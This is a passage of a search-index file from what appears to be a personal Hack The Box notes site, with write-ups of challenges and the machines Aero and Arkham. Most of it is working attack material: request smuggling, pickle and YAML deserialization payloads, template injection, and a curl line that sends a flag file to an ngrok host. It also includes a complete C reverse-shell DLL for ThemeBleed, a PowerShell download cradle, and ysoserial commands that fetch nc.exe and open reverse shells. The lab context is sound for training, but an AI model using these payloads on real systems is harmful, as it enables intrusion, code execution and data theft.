body (e.g. HTML code). The difference between the two is that -I sends a HEAD request (as will see in the next section), while -i sends any request we specify and prints the headers as well.</p> <pre><code>$ curl -I https://www.google.com                  \nHTTP/2 200 \ncontent-type: text/html; charset=ISO-8859-1\ncontent-security-policy-report-only: object-src 'none';base-uri 'self';script-src 'nonce-q3sJboMIyGhJRKaFH3MhXQ' 'strict-dynamic' 'report-sample' 'unsafe-eval' 'unsafe-inline' https: http:;report-uri https://csp.withgoogle.com/csp/gws/other-hp\np3p: CP=\"This is not a P3P policy! See g.co/p3phelp for more info.\"\ndate: Thu, 18 Jul 2024 07:29:01 GMT\nserver: gws\nx-xss-protection: 0\nx-frame-options: SAMEORIGIN\nexpires: Thu, 18 Jul 2024 07:29:01 GMT\ncache-control: private\nset-cookie: AEC=AVYB7cpAjUsbflOYRcOARfReZUlktP8S1W-BgCEuCYPxhvCbIlmEwzJJjeE; expires=Tue, 14-Jan-2025 07:29:01 GMT; path=/; domain=.google.com; Secure; HttpOnly; SameSite=lax\nset-cookie: NID=516=a6JGyRZjGM9E_rum7mHTYrel-feQOvhKIB_ZssgOQhMINRaHMw2plhKoWhUZv-OT6R3l-ds86jB5bvS3z05Dg9s3tFgbG9Bj5VL-GQxoEqiGvxkkjdCp8XOqzJgiJrks9xJrlEE1xmnFEjaUW1__HLL6ODsaPMUnoQIhK8uYy_s; expires=Fri, 17-Jan-2025 07:29:01 GMT; path=/; domain=.google.com; HttpOnly\nalt-svc: h3=\":443\"; ma=2592000,h3-29=\":443\"; ma=2592000\n</code></pre> <p><code>-b</code>: cookie</p> <pre><code>$ curl -X POST -b \"PHPSESSID=nvsaks20231jqgmmp5mnj40m4u\" -d '{\"search\":\"flag\"}' -H \"Content-Type: application/json\" http://94.237.59.199:30999/search.php -v \n</code></pre>"}, {"location": "HTB/Academy/Web%20requests/#crud-api", "title": "CRUD API", "text": "<p>CRUD stands for create, read, update, and delete. These functions are the four pillars of a complete CRUD API (and full-stack application, for that matter).</p> <p>CRUD operations are stateful and can be resource-intensive, whereas REST services are stateless, promoting scalability and simplicity. RESTful services use specific HTTP methods like GET, POST, PUT, and DELETE and require data to be in formats like JSON or XML.</p> Operation HTTP Method Description Create POST Adds the specified data to the database table Read GET Reads the specified entity from the database table Update PUT Updates the data of the specified database table Delete DELETE Removes the specified row from the database table <p>These four operations are mainly linked to the commonly known CRUD APIs, but the same principle is also used in REST APIs and several other types of APIs. Of course, not all APIs work in the same way, and the user access control will limit what actions we can perform and what results we can see.</p> <p>Note: The HTTP <code>PATCH</code> method may also be used to update API entries instead of <code>PUT</code>. To be precise, <code>PATCH</code> is used to partially update an entry (only modify some of its data \"e.g. only city_name\"), while <code>PUT</code> is used to update the entire entry. We may also use the HTTP <code>OPTIONS</code> method to see which of the two is accepted by the server, and then use the appropriate method accordingly. In this section, we will be focusing on the <code>PUT</code> method, though their usage is quite similar.</p> <pre><code>$ curl -X PUT http://83.136.252.57:50844/api.php/city/Birmingham -d '{\"city_name\":\"flag\",\"country_name\":\"(UK)\"}' -H \"Content-Type: application/json\"\n\n$ curl -X DELETE http://83.136.252.57:50844/api.php/city/Bradford\n</code></pre>"}, {"location": "HTB/Challenges/ApacheBlaze/", "title": "ApacheBlaze", "text": "<pre><code>elif game == 'click_topia':\n        if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':\n            return jsonify({\n                'message': f'{app.config[\"FLAG\"]}'\n            }), 200\n        else:\n            return jsonify({\n                'message': 'This game is currently available only from dev.apacheblaze.local.'\n            }), 200\n</code></pre> <p>According to the source code, I added <code>X-Forwarded-Host: dev.apacheblaze.local</code> into the request header. But, it didn't work. So, I decided to deploy the source code locally on Docker container.</p> <pre><code>$ python -m venv .venv\n$ source .venv/bin/activate\n\n$ chmod +x build_docker.sh\n$ ./build_docker.sh\n\n</code></pre> <p>Internal HTTP Request Smuggling via Header Injection</p> <pre><code># POC\n HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\nGET /SMUGGLED\n%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/SMUGGLED\n\n\n# Reminder for encoding : \n\n\\r\\n     -&gt;  %0d%0a\n\\r\\n\\r   -&gt;  %0d%0a%0d\n\n# tailor to fit \n HTTP/1.1\\r\\nHost: dev.apacheblaze.local\\r\\n\\r\\nGET \n%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20\n\n%20HTTP/1.1%0D%0AHost:%20dev.apacheblaze.local%0D%0A%0D%0AGET%20\n</code></pre> <p></p>"}, {"location": "HTB/Challenges/C.O.P/", "title": "C.O.P", "text": ""}, {"location": "HTB/Challenges/C.O.P/#exploiting-python-pickles", "title": "Exploiting Python pickles", "text": "<p>Exploiting Python pickles</p> <p>In Python, the <code>pickle</code> module lets you serialize and deserialize data. Essentially, this means that you can convert a Python object into a stream of bytes and then reconstruct it (including the object\u2019s internal structure) later in a different process or environment by loading that stream of bytes.</p> <pre><code># picke_test.py\nimport pickle\nimport base64\nimport os\n\n\nclass RCE:\n    def __reduce__(self):\n        cmd = ('cp flag.txt ./application/static/flag.txt')\n        return os.system, (cmd,)\n\n\nif __name__ == '__main__':\n    pickled = pickle.dumps(RCE())\n    print(base64.urlsafe_b64encode(pickled))\n</code></pre> <p><code>http://&lt;sitename&gt;/view/1' union select '&lt;Malicious Pickle&gt;</code></p> <p></p> <p><code>http://&lt;Site Name&gt;/static/flag.txt</code></p>"}, {"location": "HTB/Challenges/Distract%20and%20Destroy/", "title": "Distract and Destroy (Blockchain)", "text": "<pre><code>\u2514\u2500$ cat Setup.sol   \n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport {Creature} from \"./Creature.sol\";\n\ncontract Setup {\n    Creature public immutable TARGET;\n\n    constructor() payable {\n        require(msg.value == 1 ether);\n        TARGET = new Creature{value: 10}();\n    }\n\n    function isSolved() public view returns (bool) {\n        return address(TARGET).balance == 0;\n    }\n}\n\n$ cat Creature.sol                               \n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Creature {\n    uint256 public lifePoints;\n    address public aggro;\n\n    constructor() payable {\n        lifePoints = 1000;\n    }\n\n    function attack(uint256 _damage) external {\n        if (aggro == address(0)) {\n            aggro = msg.sender;\n        }\n\n        if (_isOffBalance() &amp;&amp; aggro != msg.sender) {\n            lifePoints -= _damage;\n        } else {\n            lifePoints -= 0;\n        }\n    }\n\n    function loot() external {\n        require(lifePoints == 0, \"Creature is still alive!\");\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n    function _isOffBalance() private view returns (bool) {\n        return tx.origin != msg.sender;\n    }\n}\n\n</code></pre> <p>Solidity Programming Language</p>"}, {"location": "HTB/Challenges/DoxPit/", "title": "DoxPit", "text": "<pre><code>/login?username=dimitry&amp;password=dimitry\n/login?username=aiden&amp;password=aiden\n\n\n</code></pre>"}, {"location": "HTB/Challenges/Neonify/", "title": "Neonify", "text": "<pre><code>post '/' do\n    if params[:neon] =~ /^[0-9a-z ]+$/i\n      @neon = ERB.new(params[:neon]).result(binding)\n    else\n      @neon = \"Malicious Input Detected\"\n    end\n    erb :'index'\n  end\n</code></pre> <pre><code># Read file\n&lt;%= File.open('flag.txt').read %&gt;\n\n# URL encoded\n%3C%25=%20File.open('flag.txt').read%20%25%3E%20#%20Read%20file%0A\n\n# start a new line to bypass RegEx filter\nneon=a\n%3C%25=%20File.open('flag.txt').read%20%25%3E%20#%20Read%20file%0A\n</code></pre> <pre><code>$ curl http://94.237.48.147:48313/ \\\n  -s -X POST -d 'neon=a\n%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E'\n</code></pre>"}, {"location": "HTB/Challenges/Oxidized%20ROP/", "title": "Oxidized ROP", "text": ""}, {"location": "HTB/Challenges/PDFy/", "title": "PDFy.md", "text": "<ul> <li>Create index.html</li> </ul> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;body&gt;\n    &lt;iframe src=\"https://prismatic-druid-f8a2b3.netlify.app/flag.php?x=/etc/passwd\" style=\"height:800px;width:100%\"&gt;&lt;/iframe&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <ul> <li>Create flag.php</li> </ul> <pre><code>&lt;?php header('location:file://'.$_REQUEST['x']); ?&gt;\n</code></pre> <p>OR</p> <ul> <li>all in one PHP file</li> </ul> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt; \n&lt;body&gt;\n&lt;?php\nheader('location:file:///etc/passwd');\n?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Set up a HTTP server with public accessible URL. And submit the URL to the website to generate PDF.</p> <p>Free Ngrok alternative</p> <pre><code>\n</code></pre>"}, {"location": "HTB/Challenges/Photon%20Lockdown/", "title": "Photon Lockdown (Hardware)", "text": "<p> Squashfs is a compressed read-only file system for Linux. Squashfs compresses files, inodes and directories, and supports block sizes from 4 KiB up to 1 MiB for greater compression. Several compression algorithms are supported. Squashfs is also the name of free software, licensed under the GPL, for accessing Squashfs filesystems. </p> <pre><code># mount squashfs filesystems\n$ sudo mount --type=\"squashfs\" --options=\"loop\" --source=\"/home/kali/HTB/challenge/ONT/rootfs\" --target=\"/tmp/rootfs\"\n\n$ ls -la /tmp/rootfs\n</code></pre> <p></p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/tmp/rootfs]\n\u2514\u2500$ find . -type f -exec cat {} \\; | grep -arin -o -E '(\\w+\\W+){0,5}password(\\W+\\w+){0,5}' .\n\n./etc/config_default.xml:244:PASSWORD\" Value=\"HTB{N0w_Y0u_C4n_L0g1n\n</code></pre> <p></p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/tmp/rootfs]\n\u2514\u2500$ cat ./etc/config_default.xml | grep -i password\n\nHTB{N0w_Y0u_C4n_L0g1n}\n</code></pre> <p></p> <pre><code># unmount squashfs file\n$ sudo umount --type=\"squashfs\" /tmp/rootfs\n</code></pre>"}, {"location": "HTB/Challenges/ProxyAsAService/", "title": "ProxyAsAService", "text": "<p>Append <code>@attacker.com</code> to a website, like <code>http://example.com@attacker.com/</code> will redirect to <code>http://attacker.com/</code></p> <p>So, according to the source code, we need to visit <code>http://localhost/debug/environment</code> to get the flag in <code>ENV</code></p> <pre><code>SITE_NAME = 'reddit.com'\n\nproxy_api = Blueprint('proxy_api', __name__)\ndebug     = Blueprint('debug', __name__)\n\n\n@proxy_api.route('/', methods=['GET', 'POST'])\ndef proxy():\n    url = request.args.get('url')\n\n    if not url:\n        cat_meme_subreddits = [\n            '/r/cats/',\n            '/r/catpictures',\n            '/r/catvideos/'\n        ]\n\n        random_subreddit = random.choice(cat_meme_subreddits)\n\n        return redirect(url_for('.proxy', url=random_subreddit))\n\n    target_url = f'http://{SITE_NAME}{url}'\n    response, headers = proxy_req(target_url)\n\n    return Response(response.content, response.status_code, headers.items())\n</code></pre> <p><code>target_url=http://reddit.com{url}</code> To complete the challenge, we need to change it to :</p> <p><code>target_url=http://reddit.com@0.0.0.0:1337/debug/environment</code></p> <p>127 and localhost have been banned and the application is deployed on port 1337 locally.</p> <pre><code>RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']\n</code></pre> <p></p> <p>Further reading:</p> <p>URL format bypass | HackTricks</p>"}, {"location": "HTB/Challenges/RenderQuest/", "title": "RenderQuest", "text": "<p>https://webhook.site/</p> <pre><code># go\n\n{{.FetchServerInfo \"ls -la\"}}\n\n{{.FetchServerInfo \"cat ../flag*\"}}\n</code></pre> <p></p> <p></p>"}, {"location": "HTB/Challenges/Watersnake/", "title": "Watersnake", "text": "<p>Vulnerable package: org.yaml.snakeyaml.Yaml</p> <p>Unsafe deserialization vulnerability in SnakeYaml (CVE-2022-1471)</p> <p>Payload:</p> <pre><code>foo:  !!com.lean.watersnake.GetWaterLevel [\"curl -d @/flag.txt https://38ec-222-152-214-247.ngrok-free.app\"]\n</code></pre> <p> </p>"}, {"location": "HTB/Challenges/baby%20website%20rick/", "title": "baby website rick", "text": "<p>All the references to <code>pickles</code> implies it's an <code>insecure deserialization</code> challenge. pickle is a serialization format used in python.</p> <p>Cookie of the website:</p> <pre><code>plan_b:KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu\n</code></pre> <p>Base64 decoded:</p> <pre><code>(dp0\nS'serum'\np1\nccopy_reg\n_reconstructor\np2\n(c__main__\nanti_pickle_serum\np3\nc__builtin__\nobject\np4\nNtp5\nRp6\ns.\n</code></pre>"}, {"location": "HTB/Challenges/baby%20website%20rick/#unpickle", "title": "Unpickle", "text": "<pre><code>from base64 import b64decode\nimport pickle\n\ncode = b'KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu'\n\nserum = pickle.loads(b64decode(code))\nprint(serum)\n</code></pre> <pre><code>$ python unpickle.py \nTraceback (most recent call last):\n  File \"/home/kali/HTB/challenges/unpickle.py\", line 7, in &lt;module&gt;\n    serum = pickle.loads(b64decode(code))\n            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nAttributeError: Can't get attribute 'anti_pickle_serum' on &lt;module '__main__' from '/home/kali/HTB/challenges/unpickle.py'&gt;\n</code></pre> <p>The error is quite clear - there's no <code>anti_pickle_serum</code> variable. Let's add one in and try again.</p> <pre><code>code=[...]\nanti_pickle_serum = 'test'\n.....\n</code></pre> <pre><code>$ python unpickle.py\nTraceback (most recent call last):\n  File \"/home/kali/HTB/challenges/unpickle.py\", line 7, in &lt;module&gt;\n    serum = pickle.loads(b64decode(code))\n            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/lib/python3.11/copyreg.py\", line 49, in _reconstructor\n    obj = object.__new__(cls)\n          ^^^^^^^^^^^^^^^^^^^\nTypeError: object.__new__(X): X is not a type object (str)\n</code></pre> <p>Here it's throwing an error because <code>X (anti_pickle_serum)</code> is not a type object - so let's make it a class extending from object.</p> <pre><code>from base64 import b64decode\n\nimport pickle\n\nclass anti_pickle_serum(object):\n    def __init__(self):\n        pass\n\ncode = b'KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu'\n\nserum = pickle.loads(b64decode(code))\nprint(serum)\n</code></pre> <pre><code>$ python unpickle.py\n{'serum': &lt;__main__.anti_pickle_serum object at 0x7f5bc322c450&gt;}\n</code></pre> <p>Exploiting Python pickles</p> <p>So by implementing <code>__reduce__</code> in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.</p> <pre><code>from base64 import b64encode\n\n#python2 use pickle\n# import pickle\n# python3 use cPickle\nimport cPickle\nimport os\nimport subprocess\n\nclass anti_pickle_serum(object):\n    def __reduce__(self):               # function called by the pickler\n        #return os.system, (['whoami'],)\n        return subprocess.check_output, (['ls'],)\n\ncode = cPickle.dumps({'serum': anti_pickle_serum()}, protocol=0)\ncode = b64encode(code)\nprint(code)\n</code></pre> <p></p> <p><code>subprocess.check_output</code> requires a list of parameters and the filename is a separate item in the list, like so:</p> <pre><code>return subprocess.check_output, (['cat', 'flag_wIp1b'],)\n</code></pre>"}, {"location": "HTB/Challenges/jscalc/", "title": "jscalc", "text": "<pre><code>require('fs').readFileSync('/flag.txt').toString();\n</code></pre>"}, {"location": "HTB/Machines/Aero/", "title": "Aero", "text": ""}, {"location": "HTB/Machines/Aero/#port-scan", "title": "Port scan", "text": "<pre><code>$ sudo nmap 10.10.11.237 -p- --min-rate=10000 -T4 -sCV\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 10.0\n|_http-title: Aero Theme Hub\n|_http-server-header: Microsoft-IIS/10.0\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre>"}, {"location": "HTB/Machines/Aero/#web-app", "title": "Web app", "text": "<p>We can upload <code>*.theme</code> and <code>*.themepack</code> files to the website.</p> <pre><code>$ feroxbuster -u http://10.10.11.237/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt --threads=50 -k -C 404\n\nNothing interesting\n</code></pre> <p>A file with the THEMEPACK file extension is a Windows theme pack file. They're created by Windows 7 to apply similarly themed desktop backgrounds, window colors, sounds, icons, cursors, and screensavers.</p> <p>A <code>.theme</code> file is a <code>.ini</code> text file that is divided into sections, which specify visual elements that appear on a Windows desktop.</p>"}, {"location": "HTB/Machines/Aero/#themebleed-rce", "title": "ThemeBleed RCE", "text": "<p>Google search <code>windows theme exploit</code> and find a RCE exploit.</p> <p>Background</p> <p>CVE-2023-38146, known as ThemeBleed, is a vulnerability in Windows Themes that allows for remote code execution. It was patched in the September 2023 Patch Tuesday.</p> <p>The vulnerability comes from how Windows handles the <code>.msstyles</code> files referenced from within the theme file. These <code>.msstyles</code> files lead to Windows opening a DLL at the same path as the <code>.msstyles</code> path with <code>_vrf.dll</code> appended. The digital signature on this file is checked before it is loaded.</p> <p>The vulnerability comes because, when version 999 is used, there\u2019s a big gap between the time when the <code>_vrf.dll</code> binary\u2019s signature is checked and when it is loaded for use. This gaps presents a race condition, where the attacker can replace the verified style DLL with a malicious payload to run arbitrary code.</p> <p>Windows 11 \u2018ThemeBleed\u2019 RCE bug gets proof-of-concept exploit</p> <p>themebleed | GitHub</p> <p>C reverse shell</p> <p>main.c</p> <pre><code>#include &lt;winsock2.h&gt;\n#include &lt;windows.h&gt;\n#include &lt;io.h&gt;\n#include &lt;process.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nstatic int ReverseShell(const char *CLIENT_IP, int CLIENT_PORT) {\n    if (strcmp(CLIENT_IP, \"0.0.0.0\") == 0 || CLIENT_PORT == 0) {\n        write(2, \"[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\\n\", 50);\n        return (1);\n    }\n\n    WSADATA wsaData;\n    if (WSAStartup(MAKEWORD(2 ,2), &amp;wsaData) != 0) {\n        write(2, \"[ERROR] WSASturtup failed.\\n\", 27);\n        return (1);\n    }\n\n    int port = CLIENT_PORT;\n    struct sockaddr_in sa;\n    SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n    sa.sin_family = AF_INET;\n    sa.sin_port = htons(port);\n    sa.sin_addr.s_addr = inet_addr(CLIENT_IP);\n\n    if (connect(sockt, (struct sockaddr *) &amp;sa, sizeof(sa)) != 0) {\n        write(2, \"[ERROR] connect failed.\\n\", 24);\n        return (1);\n    }\n\n    STARTUPINFO sinfo;\n    memset(&amp;sinfo, 0, sizeof(sinfo));\n    sinfo.cb = sizeof(sinfo);\n    sinfo.dwFlags = (STARTF_USESTDHANDLES);\n    sinfo.hStdInput = (HANDLE)sockt;\n    sinfo.hStdOutput = (HANDLE)sockt;\n    sinfo.hStdError = (HANDLE)sockt;\n    PROCESS_INFORMATION pinfo;\n    CreateProcessA(NULL, \"cmd\", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &amp;sinfo, &amp;pinfo);\n\n    return (0);\n}\n\nvoid VerifyThemeVersion()  {\n    ReverseShell(\"10.10.16.3\", 4444);\n}\n</code></pre> <pre><code>$ x86_64-w64-mingw32-gcc-win32 main.c -lws2_32 -shared -o VerifyThemeVersion.dll\n\n$ python -m pefile exports VerifyThemeVersion.dll                     \n0x2ab281578 b'VerifyThemeVersion' 1\n</code></pre> <p>Download <code>ThemeBleed</code> from this repo and unzip it. Put <code>VerifyThemeVersion.dll</code> in the <code>data</code> folder and change its name to <code>stage_3</code>, then run <code>.\\ThemeBleed.exe server</code>.</p> <p>Since the <code>ThemeBleed.exe</code> is running on my Windows virtual machine, but the reverse shell will reflect to my Kali. I need to connect these two virtual machines.</p> <p>Note: if the smb service is running on the Wins box, you need to kill it first. (win+R -&gt; <code>services.msc</code> -&gt; server -&gt; right click <code>properties</code>-&gt; disable -&gt; stop -&gt; reboot the box)</p> <p>Troubleshooting: I cannot ping my Win box from my Kali.</p> <ol> <li> <p>Click on the Start Menu</p> </li> <li> <p>Go to Control Panel</p> </li> <li> <p>Open Windows Firewall</p> </li> <li> <p>Open Advanced Settings</p> </li> </ol> <p>Select Inbound Rules over in the left window pane In the right window pane scroll down to File and Printer Sharing (Echo Request - ICMPv4-In). You will see two of these listed. The first one for enabling this rule to for a domain profile. The second one is for enabling this rule for public/private profile. Unless your PC is on a domain, select the second of these two rules.</p> <ol> <li>Right click your mouse on File and Printer Sharing (Echo Request - ICMPv4-In) Profile: Private, Public and select Enable Rule. --You will now be able to ping your host from either of your virtual machines.</li> </ol> <p></p> <pre><code># On Wins\n# make test.theme file and transfer it to my Kali\n&gt; .\\ThemeBleed.exe make_theme 10.10.16.3 test.theme\n&gt; .\\ThemeBleed.exe server\n\n# on Kali\n# everything comes to 445 will forward to my Wins box\n$ sudo socat TCP-LISTEN:445,fork,reuseaddr TCP:192.168.255.136:445\n</code></pre> <p></p> <p>Then, upload <code>test.theme</code> to the website and get the reverse shell.</p> <pre><code># check the if the dll runs correctly\n&gt; rundll32 VerifyThemeVersion.dll,VerifyThemeVersion\n</code></pre> <p>I checked the DLL file, it ran correctly, and I got a reverse shell from my Win box. But it didn't work when I upload theme file from my Kali. So, I decided use my Win box to pwn this target. But still doesn't work.</p> <p>Finally, use this repo and get the reverse shell</p> <p>Jnnshschl/CVE-2023-38146</p> <pre><code>$ cp VerifyThemeVersion.dll ./CVE-2023-38146/tb/ \n$ cp VerifyThemeVersion.dll Aero.msstyles_vrf_evil.dll\n\n$ python3 themebleed.py -r 10.10.16.3 --no-dll\n</code></pre> <p></p> <p>I compared the <code>.theme</code> files created by these two different repos. They are same. So, the probably reason might be <code>socat</code> didn't forward 445 port properly. But when I ran the exploit on Wins, it still didn't work, so it might be the repo didn't work on my circumstance.</p>"}, {"location": "HTB/Machines/Aero/#user-samemerson", "title": "User sam.emerson", "text": "<pre><code>&gt; $b64 = [Convert]::ToBase64String([IO.FILE]::ReadAllBytes(\"CVE-2023-28252_Summary.pdf\"))\n</code></pre> <p>The <code>CVE-2023-28252_Summary.pdf</code> describe the exploit as the name shows.</p> <p>CVE-2023-28252 | GitHub</p> <p><code>.blf</code> file format is handled by the vulnerable Common Log File System driver called <code>CLFS.sys</code> and that is in driver\u2019s folder within system32.</p> <p>Customize the repo to download a Powershell reverse shell and compile it in Visual Studio.</p> <p></p> <p>I used base64 encoded reverse shell, you also can upload a <code>ps1</code> file to get the reverse shell.</p> <p><code>powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3/shell.ps1')</code></p> <p></p> <p>I can fix that by going into the project settings (right click on clfs_eop in the Solutions Explorer and go to Properties), under<code>Configuration Properties &gt; Advanced set \u201cCharacter Set\u201d to \u201cUse Multi-Byte Character Set\u201d</code>. Now on \u201cRebuild Solution\u201d:</p> <p></p> <p></p> <p></p> <p>When build <code>clfs_eop.exe</code>, you need to choose <code>release</code> instead of <code>debug</code>.</p> <pre><code>&gt; certutil -f -urlcache http://10.10.16.3/clfs_eop.exe clfs_eop.exe\n</code></pre> <p></p> <p></p> <p></p>"}, {"location": "HTB/Machines/Arkham/", "title": "Arkham", "text": ""}, {"location": "HTB/Machines/Arkham/#port-scan", "title": "Port scan", "text": "<pre><code>$ sudo nmap 10.10.10.130 -p- --min-rate=10000 -T4 -sCV\n\nPORT      STATE SERVICE       VERSION\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: IIS Windows Server\n|_http-server-header: Microsoft-IIS/10.0\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n8080/tcp  open  http          Apache Tomcat 8.5.37\n| http-methods: \n|_  Potentially risky methods: PUT DELETE\n|_http-title: Mask Inc.\n49667/tcp open  msrpc         Microsoft Windows RPC\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2024-07-05T02:32:20\n|_  start_date: N/A\n|_clock-skew: -2s\n</code></pre>"}, {"location": "HTB/Machines/Arkham/#smb-shares", "title": "SMB shares", "text": "<pre><code>$ smbmap -H 10.10.10.130 -u 'anonymous' -p 'anonymous'\n$ smbclient //10.10.10.130/BatShare -U anonymous%anonymous\n</code></pre> <p>IMPORTANT.TXT</p> <pre><code>Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce\n</code></pre> <p></p> <pre><code>$ grep batman /usr/share/wordlists/rockyou.txt &gt; rockyou_batman.txt\n$ wc -l rockyou_batman.txt /usr/share/wordlists/rockyou.txt \n</code></pre> <p></p> <pre><code>$ bruteforce-luks -t 10 -f rockyou_batman.txt -w batman_state.txt -v 30 backup.img \n\nbatmanforever\n</code></pre> <pre><code>-t 10 - use 10 threads\n-f rockyou_batman.txt - list of passwords to try\n-w batman_state.txt - have bruteforce-luks use a state file, so that I can stop and resume if necessary\n-v 30 - print the progress every 30 seconds\n</code></pre> <p></p>"}, {"location": "HTB/Machines/Arkham/#mount-the-img", "title": "Mount the img", "text": "<pre><code>$ sudo cryptsetup open --type luks backup.img arkham_d\n$ ls -l /dev/mapper/\n$ sudo mkdir /mnt/arkham_d/ \n$ sudo mount /dev/mapper/arkham_d /mnt/arkham_d/\n</code></pre> <p>web.xml.bak</p> <pre><code>&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;\n&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;\n&lt;context-param&gt;\n&lt;description&gt;\nThis parameter tells MyFaces if javascript code should be allowed in\nthe rendered HTML output.\nIf javascript is allowed, command_link anchors will have javascript code\nthat submits the corresponding form.\nIf javascript is not allowed, the state saving info and nested parameters\nwill be added as url parameters.\nDefault is 'true'&lt;/description&gt;\n&lt;param-name&gt;org.apache.myfaces.ALLOW_JAVASCRIPT&lt;/param-name&gt;\n&lt;param-value&gt;true&lt;/param-value&gt;\n&lt;/context-param&gt;\nIf true, a javascript function will be rendered that is able to restore the\nformer vertical scroll on every request. Convenient feature if you have pages\nwith long lists and you do not want the browser page to always jump to the top\nif you trigger a link or button action that stays on the same page.\nDefault is 'false'\n&lt;/description&gt;\n&lt;param-name&gt;org.apache.myfaces.AUTO_SCROLL&lt;/param-name&gt;\n&lt;param-value&gt;true&lt;/param-value&gt;\n</code></pre>"}, {"location": "HTB/Machines/Arkham/#myfaces-viewstate", "title": "MyFaces ViewState", "text": "<p>Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities</p> <p><code>http://10.10.10.130:8080/userSubscribe.faces</code></p> <p></p> <p>In the source code:</p> <pre><code>&lt;input type=\"hidden\" name=\"javax.faces.ViewState\" id=\"javax.faces.ViewState\" value=\"wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE=\" /&gt;\n</code></pre>"}, {"location": "HTB/Machines/Arkham/#java-deserialization", "title": "Java deserialization", "text": "<p>exploit.py</p> <pre><code>import requests\nimport pyDes, hmac\nfrom base64 import b64decode, b64encode\nfrom hashlib import sha1\n\nurl = 'http://10.10.10.130:8080/userSubscribe.faces'\n\ndef create_payload():\n    payload = open('payload.bin', 'rb').read()\n    return encrypt_payload(payload)\n\ndef encrypt_payload(payload):\n    key = b64decode('SnNGOTg3Ni0=')\n    obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)\n    enc = obj.encrypt(payload)\n    hash_val = (hmac.new(key, bytes(enc), sha1).digest())\n    payload = enc + hash_val\n    return b64encode(payload)\n\ndef decrypt_view_state(view_state):\n    key = b64decode('SnNGOTg3Ni0=')\n    obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)\n    view_state = b64decode(view_state)\n    view_state = view_state + b'\\x00\\x00\\x00\\x00'\n    dec = obj.decrypt(view_state)\n    return dec\n\ndef exploit():\n    view_state = create_payload()\n    data = {'javax.faces.ViewState' : view_state}\n    requests.post(url, data=data)\n\nexploit()\n</code></pre> <p>Note: <code>ysoserial</code> only support jdk 11.</p> <p>Payloads: everytime you change the payload, you need to execute <code>exploit.py</code> to execute the payload on the target.</p> <pre><code>$ /usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar ysoserial-all.jar CommonsCollections5 'cmd /c ping -n 1 10.10.16.2' &gt; payload.bin\n\n# upload nc.exe to the victim\n$ /usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar ysoserial-all.jar CommonsCollections5 'powershell iwr -uri http://10.10.16.2/nc.exe -Outfile C:\\windows\\temp\\nc.exe' &gt; payload.bin\n\n# reverse shell\n$ /usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar ysoserial-all.jar CommonsCollections5 'cmd /c C:\\windows\\temp\\nc.exe -e cmd 10.10.16.2 8888' &gt; payload.bin\n</code></pre> <p></p>"}, {"location": 